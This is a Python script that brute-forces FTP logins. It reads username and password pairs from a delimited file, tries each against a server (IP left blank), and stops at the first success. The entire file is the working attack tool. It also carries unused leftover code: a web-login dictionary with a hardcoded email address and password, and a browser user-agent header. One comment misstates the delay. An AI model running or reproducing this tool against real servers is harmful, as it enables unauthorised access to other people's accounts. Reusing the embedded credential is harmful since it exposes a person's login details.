#! /usr/bin/env python3
# -*- coding: utf-8 -*-

from ftplib import FTP
import os # to use os.chdir
import time
import csv
import sys

port=21
ip=""

user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
headers = { 'User-Agent' : user_agent }

values = {
'act' : 'login',
'login[email]' : 'yzhang@i9i8.com',
'login[password]' : '123456'
}

d = ':'
if sys.argv[1] == '-d':
    d = sys.argv[2]
    fname = sys.argv[3]
else:
    fname = sys.argv[1]

with open(fname) as f:
    content = f.readlines()
# to remove whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content]


print("connecting to... %s " %(ip), end='')
ftp = FTP(ip)
print("Connection successfully.")

for line in csv.reader(content, delimiter=d):
    username = line[0]
    password = line[1]
    print("user: %s\tpass: %s\t " %(username, password), end='')

    try:
        ftp.login(username,password)
        ftp.quit()
        print("- success!!")
        sys.exit(0)
    except Exception as inst:
        print("- ouch, not valid       :(")

    time.sleep(1)   # delays for 5 seconds.

sys.exit()
